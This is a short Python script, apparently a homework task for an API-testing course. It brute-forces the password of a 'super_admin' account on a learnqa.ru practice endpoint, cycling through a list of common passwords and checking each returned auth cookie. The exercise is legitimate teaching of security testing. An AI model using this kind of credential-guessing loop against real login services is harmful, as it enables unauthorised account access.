import requests

url_link = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"

mas_passw = ['password', '123456', '123456789', '12345678', '12345', 'qwerty', 'abc123', 'football', '1234567',
             'monkey', '111111', 'letmein', '1234', '1234567890', 'dragon', 'baseball', 'sunshine', 'iloveyou',
             'trustno1', 'princess', 'adobe123', '123123', 'welcome', 'login', 'admin', 'qwerty123', 'solo',
             '1q2w3e4r', 'master', '666666', 'photoshop', '1qaz2wsx', 'qwertyuiop', 'ashley', 'mustang', '121212',
             'starwars', '654321', 'bailey', 'access', 'flower', '555555', 'passw0rd', 'shadow', 'lovely', '7777777',
             'michael', '!@#$%^&*', 'jesus', 'password1', 'superman', 'hello', 'charlie',  '888888', '696969', 'hottie',
             'freedom', 'aa123456', 'qazwsx', 'ninja', 'azerty', 'loveme', 'whatever', 'donald', 'batman', 'zaq1zaq1',
             'Football', '000000', '123qwe']

for i in mas_passw:
    payload = {'login':'super_admin','password': i }

    response = requests.post(url_link, data = payload)
    cookie_value = response.cookies.get('auth_cookie')
    cookies = {'auth_cookie': cookie_value}

    url_link1 = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"

    response1 = requests.post(url_link1, cookies = cookies)
    text_otvet = response1.text

    if text_otvet != 'You are NOT authorized':
        print("Верный пароль: ", i)
        print(response1.text)
        break